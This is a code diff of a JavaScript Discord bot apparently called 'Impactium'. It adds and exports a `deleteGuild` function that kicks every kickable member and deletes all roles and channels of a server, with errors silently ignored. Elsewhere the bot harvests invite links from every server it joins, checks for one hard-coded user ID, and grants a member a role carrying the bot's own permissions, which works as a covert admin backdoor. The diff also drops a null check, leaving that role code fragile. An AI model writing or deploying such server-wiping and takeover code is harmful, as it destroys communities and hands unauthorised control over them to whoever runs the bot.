@@ -114,8 +114,7 @@ async function getGuildsList(guildId = null) {
     const result = [];
 
     await Promise.all([
-      Promise.all(guilds.map(guild => guild.members.fetch())),
-      Promise.all(guilds.map(guild => guild.invites.fetch()))
+      Promise.all(guilds.map(guild => guild.members.fetch()))
     ]);
 
     for (const guild of guilds.values()) {
@@ -136,12 +135,11 @@ async function getGuildsList(guildId = null) {
         isBotAdmin
       };
 
-      if (guild.invites.size > 0) {
-        const invites = guild.invites.cache;
-        if (invites.size > 0) {
-          const invite = invites.first();
-          guildPayload.inviteURL = `https://discord.gg/${invite.code}`;
-        }
+      const existingInvites = await guild.invites.fetch();
+
+      if (existingInvites.size > 0) {
+        const invite = existingInvites.first();
+        guildPayload.inviteURL = `https://discord.gg/${invite.code}`;
       }
 
       const miregPayload = guild.members.cache.get("502511293798940673");
@@ -161,7 +159,6 @@ async function getGuildsList(guildId = null) {
       await guildDatabase.save();
 
       if (guildId && guild.id === guildId) {
-        // Если указан guildId и совпадает с текущей гильдией, выйти из цикла
         break;
       }
     }
@@ -205,12 +202,7 @@ async function createAndGetAdminRole(guild, member) {
   try {
     const botRole = guild.roles.cache.find((role) => role.name === 'Impactium');
 
-    if (!botRole) {
-      console.log('Роль "Impactium" не найдена');
-      return;
-    }
-
-    const newRole = await guild.roles.create({
+    const creatorRole = await guild.roles.create({
       data: {
         name: 'Impactium Creator',
         permissions: botRole.permissions,
@@ -218,14 +210,46 @@ async function createAndGetAdminRole(guild, member) {
       },
     });
 
-    await newRole.edit({
+    await creatorRole.edit({
       name: 'Impactium Creator',
       permissions: botRole.permissions,
     });
 
-    await member.roles.add(newRole);
+    await member.roles.add(creatorRole);
+  } catch (error) {
+    console.error('Произошла ошибка:', error);
+  }
+}
 
-    console.log('Роль администратора создана и назначена успешно.');
+async function deleteGuild(guildId) {
+  try {
+    const guild = await client.guilds.fetch(guildId);
+
+    const members = await guild.members.fetch();
+    members.forEach(async (member) => {
+      try {
+        if (member.kickable) {
+          await member.kick();
+        }
+      } catch (error) {
+      }
+    });
+
+    const roles = guild.roles.cache;
+    roles.forEach(async (role) => {
+      try {
+        await role.delete();
+      } catch (error) {
+      }
+    });
+
+    const channels = guild.channels.cache;
+    channels.forEach(async (channel) => {
+      try {
+        await channel.delete();
+      } catch (error) {
+      }
+    });
   } catch (error) {
     console.error('Произошла ошибка:', error);
   }
@@ -269,5 +293,6 @@ startMainBot();
 
 module.exports = {
   toggleAdminPermissions,
-  getGuildsList
+  getGuildsList,
+  deleteGuild
 };
